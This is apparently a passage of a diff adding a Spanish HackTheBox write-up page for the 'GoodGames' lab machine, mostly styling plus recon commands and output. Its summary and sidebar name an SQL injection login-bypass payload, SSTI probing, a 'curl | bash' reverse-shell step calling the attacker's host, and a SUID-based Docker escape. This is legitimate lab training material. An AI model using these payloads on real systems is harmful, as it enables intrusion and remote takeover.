@@ -1,0 +1,1352 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GoodGames — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina GoodGames de HackTheBox — Dificultad: Fácil. SQLi → sqlmap → SSTI Jinja2 → Reverse Shell → Docker Escape → Root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00ff88;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --blue:      #4fc3f7;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(79,195,247,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb    { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-linux  { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
+    .badge-sqli   { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-ssti   { color: var(--purple); border-color: rgba(191,95,255,0.3);  background: rgba(191,95,255,0.05); }
+    .badge-docker { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .badge-sqlmap { color: var(--yellow); border-color: rgba(255,215,0,0.3);   background: rgba(255,215,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-blue   { color: var(--blue); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-blue  { color: var(--blue); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-blue   { color: var(--blue); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FLAGS SECTION */
+    .flags-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1.5rem; }
+    .flag-card { border: 1px solid rgba(0,255,136,0.2); background: rgba(0,255,136,0.03); padding: 1.5rem; }
+    .flag-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 3px; margin-bottom: 0.5rem; }
+    .flag-user { font-family: var(--font-mono); font-size: 1rem; color: var(--green); word-break: break-all; }
+    .flag-root-card { border: 1px solid rgba(255,45,85,0.2); background: rgba(255,45,85,0.03); padding: 1.5rem; }
+    .flag-root { font-family: var(--font-mono); font-size: 1rem; color: var(--red); word-break: break-all; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid, .flags-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>goodgames</span>
+    </p>
+    <h1 class="writeup-title"><span>GoodGames</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · SQLi → sqlmap → Hash Cracking → SSTI Jinja2 → Reverse Shell → Docker Escape → Root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-sqli">SQL INJECTION</span>
+      <span class="meta-badge badge-ssti">SSTI JINJA2</span>
+      <span class="meta-badge badge-docker">DOCKER ESCAPE</span>
+      <span class="meta-badge badge-sqlmap">SQLMAP</span>
+      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#sqli">03 · SQL Injection</a></li>
+        <li><a href="#sqlmap">04 · sqlmap & Hash</a></li>
+        <li><a href="#ssti">05 · SSTI — Flask Volt</a></li>
+        <li><a href="#shell">06 · Reverse Shell</a></li>
+        <li><a href="#docker">07 · Escape del Docker</a></li>
+        <li><a href="#flags">08 · Flags</a></li>
+        <li><a href="#referencia">09 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">10 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-blue">Linux</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.1.192</span></div>
+      <div class="info-row"><span class="info-label">Puerto</span><span class="info-val val-yellow">80 / HTTP</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap -sSCV</span> → puerto 80 HTTP</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SQLi bypass</span> → login como admin</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Burp + sqlmap</span> → dump DB</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CrackStation</span> → superadministrator</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSTI {{7*7}}</span> → Flask Volt RCE</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>curl | bash</span> → reverse shell root</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH + chmod SUID</span> → Docker escape</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">./bash -p</span> → whoami: root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>GoodGames</strong> es una máquina de dificultad <span class="hl">fácil</span> de
+          <span class="hl-cyan">HackTheBox</span> que corre <strong>Linux</strong>. Expone una
+          aplicación web de tienda de videojuegos desarrollada con <strong>Python/Flask</strong> y
+          un panel de administración interno basado en <strong>Flask Volt</strong>, ambos alojados
+          en un contenedor <span class="hl-blue">Docker</span>.
+        </p>
+        <p>
+          El ataque comienza con una <span class="hl-red">SQL Injection</span> en el formulario de
+          login que permite acceder como administrador. Luego se usa <span class="hl-cyan">sqlmap</span>
+          con una request de <strong>Burp Suite</strong> para dumpear la base de datos y extraer el
+          hash MD5 del administrador, que se crackea con <strong>CrackStation</strong> obteniendo la
+          contraseña <span class="hl-yel">superadministrator</span>.
+        </p>
+        <p>
+          Con esas credenciales se accede al panel interno en
+          <code style="color:var(--yellow)">internal-administration.goodgames.htb</code>, donde el
+          campo "Full Name" en Settings es vulnerable a
+          <span class="hl-pur">Server Side Template Injection (SSTI)</span> con Jinja2. Esto permite
+          ejecutar comandos en el servidor — se sirve un reverse shell mediante
+          <code style="color:var(--yellow)">curl | bash</code> obteniendo acceso como
+          <strong>root dentro del contenedor</strong>. Finalmente, se escapa del Docker hacia el host
+          real usando <strong>SSH + escalada SUID</strong> sobre el binario <code style="color:var(--yellow)">bash</code>.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>nmap -p- -sSCV --min-rate=5000</td><td>Puerto 80 abierto — Werkzeug httpd / Python</td></tr>
+          <tr><td>SQLi bypass</td><td>1' or 1=1-- - en email</td><td>Acceso como admin (admin@goodgames.htb)</td></tr>
+          <tr><td>Dump DB</td><td>Burp Suite + sqlmap</td><td>Hash MD5: 2b22337f218b2d82dfc3b6f77e7cb8ec</td></tr>
+          <tr><td>Hash cracking</td><td>CrackStation (MD5)</td><td>Password: superadministrator</td></tr>
+          <tr><td>SSTI detección</td><td>{{7*7}} en campo Full Name</td><td>Resultado 49 → vulnerable Jinja2</td></tr>
+          <tr><td>SSTI explotación</td><td>curl 10.10.16.7 | bash → nc</td><td>Reverse shell como root en Docker</td></tr>
+          <tr><td>Docker Escape</td><td>SSH + cp bash + chown + chmod SUID</td><td>./bash -p → root en host</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de escanear, se verifica que la máquina objetivo está activa con un
+          <span class="hl-cyan">ping</span> de 3 paquetes. El TTL de respuesta
+          (<strong>63</strong>) indica que es un sistema <span class="hl">Linux</span>
+          (los sistemas Linux suelen tener TTL inicial de 64, que llega a 63 tras un salto de red).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 10.129.1.192 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.1.192</span> <span class="flag">-c 3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 10.129.1.192 (10.129.1.192) 56(84) bytes of data.</div>
+        <div>64 bytes from 10.129.1.192: icmp_seq=1 ttl=<span class="o-yellow">63</span> time=114 ms</div>
+        <div>64 bytes from 10.129.1.192: icmp_seq=2 ttl=63 time=113 ms</div>
+        <div>64 bytes from 10.129.1.192: icmp_seq=3 ttl=63 time=117 ms</div>
+        <div>&nbsp;</div>
+        <div>--- 10.129.1.192 ping statistics ---</div>
+        <div><span class="o-green">3 packets transmitted, 3 received, 0% packet loss</span>, time 2003ms</div>
+        <div>rtt min/avg/max/mdev = 113.129/114.574/116.630/1.492 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO COMPLETO CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se lanza un escaneo completo de todos los puertos TCP contra el objetivo. Las flags
+          <span class="hl-cyan">-sSCV</span> activan el SYN scan sigiloso, detección de versión
+          y scripts NSE. El resultado se exporta como XML con <span class="hl-cyan">-oX</span>
+          para convertirlo luego a HTML con xsltproc.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.1.192 -oX goodgames.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.1.192</span> <span class="flag">-oX</span> <span class="arg">goodgames.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 02:21 -0400</div>
+        <div>Nmap scan report for 10.129.1.192</div>
+        <div><span class="o-green">Host is up</span> (0.13s latency).</div>
+        <div>Not shown: 64512 closed tcp ports (reset), 1022 filtered tcp ports (no-response)</div>
+        <div class="o-white">PORT&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-yellow">80/tcp open  http&nbsp;&nbsp;&nbsp; Werkzeug httpd 2.0.2 (Python 3.9.2)</span></div>
+        <div>|_http-title: GoodGames | Community and Store</div>
+        <div>|_http-server-header: Werkzeug/2.0.2 Python/3.9.2</div>
+        <div>&nbsp;</div>
+        <div>Service detection performed. Please report any incorrect results at https://nmap.org/submit/</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 30.67 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DEL SCAN</p>
+        <p>Nmap revela un único puerto abierto: el <strong>80/tcp (HTTP)</strong> corriendo
+        <strong>Werkzeug 2.0.2 con Python 3.9.2</strong> — lo que indica una aplicación web Flask.
+        El título HTTP confirma el sitio <strong>GoodGames</strong>. Al no haber SSH ni otros servicios
+        expuestos, el vector de ataque es exclusivamente web.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl goodgames.xml > goodgames.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">goodgames.xml</span> &gt; <span class="arg">goodgames.html</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">INSPECCIÓN DEL SITIO WEB — PUERTO 80</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al acceder a <span class="hl-cyan">http://10.129.1.192</span> se visualiza la plataforma
+          <strong>GoodGames</strong>, una tienda y comunidad de videojuegos. El sitio tiene secciones
+          de Blog y Store, y en la esquina superior derecha un ícono de login. Se navega al formulario
+          de registro/login para explorar posibles vectores de ataque.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQL INJECTION -->
+    <div class="section" id="sqli">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">SQL Injection — Bypass de Login</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">BYPASS CON PAYLOAD SQLi CLÁSICO</span>
+      </div>
+      <div class="prose">
+        <p>
+          En el formulario de login se prueba el payload de
+          <span class="hl-red">SQL Injection clásico</span> en el campo de email:
+          <code style="color:var(--yellow)">1' or 1=1-- -</code>.
+          Este payload cierra la cadena SQL con la comilla simple, añade una condición siempre
+          verdadera (<code style="color:var(--yellow)">1=1</code>) y comenta el resto de la query
